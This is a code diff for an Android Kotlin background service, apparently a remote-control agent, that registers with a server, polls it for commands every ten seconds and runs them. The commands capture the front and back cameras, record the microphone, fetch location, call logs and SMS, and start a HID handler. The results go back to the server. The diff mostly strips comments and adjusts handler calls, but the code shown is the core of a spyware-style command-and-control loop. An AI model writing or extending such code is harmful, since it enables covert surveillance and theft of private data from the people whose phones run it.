@@ -12,6 +12,7 @@ import com.alingo.agent.cache.LocalCache
 import com.alingo.agent.client.BluetoothClient
 import com.alingo.agent.client.ConnectionManager
 import com.alingo.agent.client.WifiClient
+import com.alingo.agent.handlers.*
 import com.alingo.agent.hid.HidHandler
 import kotlinx.coroutines.*
 import java.util.UUID
@@ -40,7 +41,6 @@ class AgentService : Service() {
         super.onCreate()
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, buildNotification())
-        
         cache = LocalCache(this)
         hidHandler = HidHandler(this)
     }
@@ -61,21 +61,11 @@ class AgentService : Service() {
             return START_NOT_STICKY
         }
 
-        // Clients initialize
         val wifi = WifiClient(server, agentToken)
         val bt = BluetoothClient(this)
-        
-        // Try Bluetooth (if previously paired)
-        val btAddress = prefs.getString("bt_address", "")
-        if (btAddress?.isNotEmpty() == true) {
-            scope.launch {
-                bt.connect(btAddress!!)
-            }
-        }
 
         connectionManager = ConnectionManager(this, wifi, bt)
 
-        // Register with server
         scope.launch {
             val success = wifi.register(deviceUid, token = agentToken)
             if (success) {
@@ -86,10 +76,9 @@ class AgentService : Service() {
             }
         }
 
-        // Periodic retry of queued commands
         scope.launch {
             while (isRunning) {
-                delay(60000)  // Every minute
+                delay(60000)
                 connectionManager.retryQueuedCommands()
             }
         }
@@ -101,9 +90,9 @@ class AgentService : Service() {
         scope.launch {
             while (isRunning) {
                 try {
-                    // ✅ Heartbeat (keep-alive)
+                    // ✅ Heartbeat
                     connectionManager.wifiClient.heartbeat(deviceUid)
-                    
+
                     val commands = connectionManager.wifiClient.pollCommands()
                     if (commands != null && commands.isNotEmpty()) {
                         Log.i(TAG, "📥 ${commands.size} commands")
@@ -114,7 +103,7 @@ class AgentService : Service() {
                 } catch (e: Exception) {
                     Log.e(TAG, "Poll: ${e.message}")
                 }
-                delay(10000)  // 10 sec
+                delay(10000)
             }
         }
     }
@@ -132,9 +121,9 @@ class AgentService : Service() {
         val result: Map<String, Any?> = try {
             when (type) {
                 "get_location" -> LocationHandler.getLocation(this)
-                "camera_front" -> CameraHandler.capture(this, "front")
-                "camera_back" -> CameraHandler.capture(this, "back")
-                "record_mic" -> MicHandler.record(this, (payload["duration"] as? Int) ?: 30)
+                "camera_front" -> CameraHandler.capture("front")
+                "camera_back" -> CameraHandler.capture("back")
+                "record_mic" -> MicHandler.record((payload["duration"] as? Int) ?: 30)
                 "get_calls" -> CallLogHandler.getCalls(this, (payload["limit"] as? Int) ?: 50)
                 "get_sms" -> SmsHandler.getSms(this, (payload["limit"] as? Int) ?: 50)
                 "hid_start" -> { hidHandler.start { }; mapOf("success" to true) }
@@ -147,13 +136,11 @@ class AgentService : Service() {
             mapOf("error" to (e.message ?: "unknown"))
         }
 
-        // Send result
         val cmdId = cmd["id"]?.toString() ?: return
         val (_, mode) = connectionManager.sendCommand(mapOf(
             "command_id" to cmdId,
             "result" to result
         ))
-
         Log.i(TAG, "✅ $type → $mode")
     }
 
@@ -190,7 +177,6 @@ class AgentService : Service() {
     }
 }
 
-// Extension: JSONObject to Map
 private fun org.json.JSONObject.toMap(): Map<String, Any?> {
     val map = mutableMapOf<String, Any?>()
     keys().forEach { key -> map[key] = get(key) }
